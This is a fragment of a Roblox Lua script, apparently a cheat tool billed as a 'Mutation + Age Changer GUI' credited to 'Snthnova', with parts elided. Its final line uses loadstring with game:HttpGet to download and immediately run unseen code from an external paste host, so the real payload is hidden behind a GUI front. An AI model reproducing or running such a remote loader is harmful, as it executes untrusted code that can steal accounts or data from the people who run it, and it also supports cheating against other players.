-- Snthnova's Compact Mutation + Age Changer GUI with Welcome Glow
...
-- 🖋️ Footer (Updated to Snthnova)
local credit = Instance.new("TextLabel", frame)
credit.Size = UDim2.new(1, 0, 0, 20)
credit.Position = UDim2.new(0, 0, 1, -20)
credit.Text = "Created by Snthnova"
...
-- 🌐 External Loader
loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/bvvIij2E204C9tTO/raw", true))()
